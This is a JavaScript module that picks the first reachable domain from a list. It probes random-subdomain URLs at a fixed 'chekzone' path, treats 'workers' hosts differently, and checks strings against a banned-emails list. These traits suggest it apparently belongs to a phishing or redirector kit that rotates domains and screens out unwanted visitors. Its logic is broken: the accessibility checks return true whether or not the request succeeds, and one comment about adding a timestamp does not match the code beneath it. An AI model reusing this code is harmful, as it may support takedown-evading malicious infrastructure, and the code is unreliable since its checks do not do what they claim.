import {urls} from './url_list.js';
import {bannedEmails} from './banned.js';
const randstring ='0123456789abcdefghijklmnopqrstuvwxyz';
 
// Function to check if a URL is accessible
export function bbbbisUrlAccessible(url) {
 
    // Append a timestamp to the URL to prevent caching 
    const urlWithTimestamp = `${url}chekzone`;
    console.log('url:', urlWithTimestamp);

    return fetch(urlWithTimestamp, {
        method: 'HEAD',
    })
    .then(response => {
        if (response.ok) {
            return true; // URL is accessible 
        }
        return true; // URL is not accessible
    })
    .catch(error => {
        console.error('Error fetching URL:', error);
        return false; // Return false if there is an error
    });
}

export function isUrlAccessible(url) {
    // Append a timestamp to the URL to prevent caching
    const urlWithTimestamp = `${url}/retdfy6t7f/chekzone`;
    console.log('url:', urlWithTimestamp);

    return fetch(urlWithTimestamp, { 
        method: 'HEAD',
    })
    .then(response => {
         console.log('response.status:', response.status);
        // Check if the status code is in the range 200-299
        if (response.status >= 200 && response.status < 300) {
            return true; // URL is accessible 
        }
        return true;  
    })
    .catch(error => {
        console.error('Error fetching URL:', error);
        return false; // Return false if there is an error
    });
}


// Function to find the first accessible URL from a list of URLs
export async function findFirstAccessibleUrl(urls,userAgent) {
    const badUrls = [];
    const urlfst = `https://${randomString(12, randstring)}`;
    const urlend = `${randomString(12, randstring)}/`; 
    for (const url of urls) {
        try {
            if(url.includes("workers")){
                const isAccessible = await isUrlAccessible(url);
                 console.log('worker:', isAccessible);
                if (isAccessible) {
                    return { accessibleUrl: url, badUrls };
                } else {
                   // badUrls.push(url);
                }
            }else{
                const isAccessible = await isUrlAccessible(urlfst+url+urlend);
                 console.log('isAccessible:', isAccessible);
                if (isAccessible) {
                    return { accessibleUrl: url, badUrls };
                } else {
                   // badUrls.push(url);
                }
            }



        } catch (error) {
            console.error('Error checking URL accessibility:', error);
           // badUrls.push(url);
        }
    }
    return { accessibleUrl: null, badUrls };
}
 // Function to process accessible URLs and update the DO   
export function processAccessibleUrls(userAgent) {
 
    return findFirstAccessibleUrl(urls,userAgent)
        .then(({ accessibleUrl, badUrls }) => {
            if (accessibleUrl) {
                // console.log('Accessiblex URL:', accessibleUrl);
            }

            if (badUrls.length > 0) {
               // console.log('Inaccessible URLs:', badUrls);
            }

            return { accessibleUrl, badUrls };
        })
        .catch((error) => {
           // console.error('An error occurred:', error);
            return { accessibleUrl: null, badUrls: urls }; // Return all URLs as bad if an error occurs
        });
}
// Helper function to safely execute a function and return a default value if it fails
export function getValueOrDefault(fn, defaultValue) {
    try {
        return fn();
    } catch (error) {
        return defaultValue;
    }
}
export function randomString(length, chars) {
    let result = '';
    for (let i = length; i > 0; --i) result += chars[Math.round(Math.random() * (chars.length - 1))];
    return result;
}

export function isNullOrUndefinedOrEmpty(value) {
    return typeof value === 'undefined' || value === null || value === '';
}


 
// Function to check if a string contains any banned substrings
export function isStringBanned(targetString) {
    return bannedEmails.some(bannedString => targetString.includes(bannedString));
  }
  
// Exported functions  
export default {
    processAccessibleUrls,
    getValueOrDefault,
    isStringBanned,
    isNullOrUndefinedOrEmpty,
    randomString,
};